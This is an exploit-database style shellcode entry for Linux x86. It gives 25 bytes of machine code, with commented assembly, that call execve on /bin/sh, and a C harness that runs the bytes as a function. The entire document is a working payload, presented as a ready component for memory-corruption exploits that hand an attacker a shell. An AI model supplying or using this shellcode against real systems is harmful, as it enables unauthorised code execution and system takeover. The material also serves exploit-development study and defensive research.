# Exploit Title: Linux/x86 - execve /bin/sh ShellCode (25 bytes)
# Date: 2019-10-14
# Author: bolonobolo
# Vendor Homepage: None
# Software Link: None
# Tested on: Linux x86
# CVE: N/A

/*
global _start

section .text
_start:


	cdq		        ; xor edx
	mul edx
	lea ecx, [eax]
	mov esi, 0x68732f2f
	mov edi, 0x6e69622f
	push ecx                ; push NULL in stack
	push esi
	push edi                ; push hs/nib// in stack
	lea ebx, [esp]          ; load stack pointer to ebx
	mov al, 0xb             ; load execve in eax
	int 0x80                ; execute

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}